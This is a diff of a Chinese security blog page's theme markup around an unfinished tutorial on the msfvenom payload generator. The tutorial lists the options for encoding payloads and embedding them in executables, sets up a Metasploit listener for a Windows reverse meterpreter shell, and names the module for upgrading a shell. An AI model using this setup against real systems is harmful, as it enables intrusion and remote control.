@@ -1,176 +1,68 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 
-<!-- Head tag -->
 <head>
-
     <meta charset="utf-8">
+    
+    <title>msfvenom 进阶 [暂未完...] | APT404-不疯不魔怎么活</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <!--Description-->
-    
-        <meta name="description" content="0x01 msfvenom 常规选项用途:123456789-l  列出所有可用的payload,编码器,空指令……-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式-e  指定要使用那种编码器-i  指定编码的次数,如果使用编码器-b  指定坏字符,比如空字符截断问题,等等……-x  使用一个自定义可执行程序模板,并将payload嵌入其中-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用-o  指定创建好的payload的存放位置
-0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例12345msf &amp;gt; use exploit/multi/handlermsf &amp;gt; set payload windows/meterpreter/reverse_tcpmsf &amp;gt; set lport 443msf &amp;gt; set lhost 192.168.3.12msf &amp;gt; exploit -j">
-    
-
-    <!--Author-->
-    
-        <meta name="author" content="John Doe">
-    
-
-    <!--Open Graph Title-->
-    
-        <meta property="og:title" content="msfvenom 进阶 [暂未完...]"/>
-    
-
-    <!--Open Graph Description-->
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="article" />
-    
-
-    <!--Page Cover-->
-    
-
-    <meta name="twitter:card" content="summary" />
-    
-
-    <!-- Title -->
-    
-    <title>msfvenom 进阶 [暂未完...] - APT404-不疯不魔怎么活</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/style.css">
-
-    <!-- Google Analytics -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="/favicon/favicon.ico">
+    <link rel="stylesheet" href="/css/main.css">
+    <link rel="stylesheet" href="/css/tagplugins.css">
+    <link rel="stylesheet" href="/css/highlight.css">
     
 
 
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="APT404-不疯不魔怎么活" type="application/atom+xml" />
+    
 </head>
 
-
 <body>
-
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
-
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/contact.html">
-                    Contact
-                </a>
-            </li>
-            
-        </ul>
-    </div>
+  <div class="blog-header">
+   <a id="menu-nav-icon"><img src="/image/menu.png"/></a>
+   <div class="nav-container">
+     <nav id="main-nav">
+       
+         <a class="main-nav-link" href="/">Home</a>
+       
+         <a class="main-nav-link" href="/archives">Archives</a>
+       
+     </nav>
+   </div>
+   <!--
+   <div id="search-form-wrap">
+     <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://apt404.github.io"></form>
+   </div>
+ -->
+    <h1 class="blog-title">APT404-不疯不魔怎么活</h1>
+    <p class="lead blog-description">在接下来的余生中,只做一件事,从 0 到 1</p>
 </div>
 
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+  <div id='main-part'>
+      <div class="main">
+<div class="blog-post">
+    <!-- Title -->
+    <h1 class="blog-post-title">
+        <a href="/2017/03/09/msfvenom-advanced/">
+            Msfvenom 进阶 [暂未完...]
+        </a>
+    </h1>
+    <!-- Date and Author -->
+    <p class="blog-post-meta">
+        2017-03-09
         
-    </div>
-</header>
+    </p>
 
-        <section class="main">
-            
-<div class="post">
+    
 
-    <div class="post-header">
-        <h1 class="title">
-            <a href="/2017/03/09/msfvenom-advanced/">
-                msfvenom 进阶 [暂未完...]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-03-09</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/msfvenom/">msfvenom</a>
-                </span>
-            
-        </div>
-    </div>
-
-    <div class="content">
-
-        <!-- Gallery -->
-        
-
-        <!-- Post Content -->
-        <p>0x01 msfvenom 常规选项用途:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l  列出所有可用的payload,编码器,空指令……</span><br><span class="line">-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span><br><span class="line">-e  指定要使用那种编码器</span><br><span class="line">-i  指定编码的次数,如果使用编码器</span><br><span class="line">-b  指定坏字符,比如空字符截断问题,等等……</span><br><span class="line">-x  使用一个自定义可执行程序模板,并将payload嵌入其中</span><br><span class="line">-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span><br><span class="line">-o  指定创建好的payload的存放位置</span><br></pre></td></tr></table></figure></p>
+    <!-- Content -->
+    <p>0x01 msfvenom 常规选项用途:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l  列出所有可用的payload,编码器,空指令……</span><br><span class="line">-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span><br><span class="line">-e  指定要使用那种编码器</span><br><span class="line">-i  指定编码的次数,如果使用编码器</span><br><span class="line">-b  指定坏字符,比如空字符截断问题,等等……</span><br><span class="line">-x  使用一个自定义可执行程序模板,并将payload嵌入其中</span><br><span class="line">-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span><br><span class="line">-o  指定创建好的payload的存放位置</span><br></pre></td></tr></table></figure></p>
 <p>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set lport 443</span><br><span class="line">msf &gt; set lhost 192.168.3.12</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <p>0x03 实例创建各类系统平台下的payload:</p>
@@ -202,215 +94,98 @@
 <p>0x06 将普通类型的shell升级为meterpreter:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/multi/manage/shell_to_meterpreter</span><br></pre></td></tr></table></figure></p>
 <p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;只匆忙地写了一小半,实在太困了,抽空再续…抱歉</p>
 
-    </div>
+
+    <!-- Social share choices -->
+    
+  <div id="social-share">
+    <a data-url="https://apt404.github.io/2017/03/09/msfvenom-advanced/" href="https://plus.google.com/share?url=" class="googleplus"><img src="/image/googleplusicon.png" alt=""/></a>
+    <a data-url="https://apt404.github.io/2017/03/09/msfvenom-advanced/" href="https://twitter.com/intent/tweet?url=" class="twitter"><img src="/image/twittericon.png" alt=""/></a>
+    <a data-url="https://apt404.github.io/2017/03/09/msfvenom-advanced/" href="http://pinterest.com/pin/create/button/?url=" class="pinterest"><img src="/image/pinteresticon.png" alt=""/></a>
+    <a data-url="https://apt404.github.io/2017/03/09/msfvenom-advanced/" href="https://www.facebook.com/sharer/sharer.php?u=" class="facebook"><img src="/image/facebookicon.png" alt=""/></a>
+  </div>
+
+
+
+
+
+<!--
+
+
+https://www.facebook.com/sharer/sharer.php?u=https://apt404.github.io/2017/03/09/msfvenom-advanced/
+https://apt404.github.io/2017/03/09/msfvenom-advanced/
+-->
+
+
+
+    <hr />
+
+
+    <!-- Tags and Categories links -->
+    
+
+
+<div class="blog-categories-container">
+    <span><img src="/image/categoriesicon.png" alt=""/></span> 
+    <a href="/categories/msfvenom/">msfvenom</a>
+</div>
+
 
     
 
+
+<div class="blog-tags-container">
+    <span><img src="/image/tagsicon.png" alt=""/></span>
+    <a href="/tags/msfvenom/">#msfvenom</a>
+</div>
+
+
+
+    <!-- Comment using disqus -->
     
-        <div class="post-tags">
-            <i class="fa fa-tags" aria-hidden="true"></i>
-            <a href="/tags/msfvenom/">#msfvenom</a>
-        </div>
+
+</div>
+</div>
+
+
+  </div>
+  <!-- Footer -->
+  <div id="footer">
+  <div id="footer-social">
     
-
-    <!-- Comments -->
     
-
-</div>
-        </section>
-
-    </div>
-</div>
-
-
+    
+    
+    
+    
 </div>
 
-<!-- Footer -->
-<div class="push"></div>
+  <p id="footer-info">
+    &copy; 2018 APT-404<br>
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> -
+    Theme <a href="https://github.com/Suolawangzai/hexo-theme-nebula" target="_blank">nebula</a>
+  </p>
 
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/26/modify-hacked/">用shell对指定站点进行简单的实时入侵预警</a>
-            </li>
-            
-        </ul>
-    </div>
-
-
-
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/privilege/">privilege</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/NetRipper/">NetRipper</a>
-        </li>
-        
-    </ul>
+  <div id="busuanzi">
+    <span id="busuanzi_container_site_pv">
+      &hearts;
+    Total visits: <span id="busuanzi_value_site_pv"></span>
+    </span>
+  </div>
+  <!--
+  <div id="footer-info">
+    &copy; 2018 APT-404<br>
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+  </div>
+-->
 </div>
 
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    <li class="list-inline-item">
-                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-github"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://twitter.com/?lang=en">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-twitter"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.facebook.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-facebook"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.instagram.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-instagram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://dribbble.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-dribbble"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://plus.google.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-google-plus"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.behance.net/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-behance"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://500px.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-500px"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="mailto:test@example.com">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-envelope-o"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="\#">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-rss"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
-            </div>
-        </div>
-    </div>
-</footer>
+  <!-- After footer scripts -->
+  <!-- Disqus Comments -->
 
-<!-- After footer scripts -->
 
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <script src="/js/main.js"></script>
-
-<!-- Disqus Comments -->
-
-
 
 </body>
 
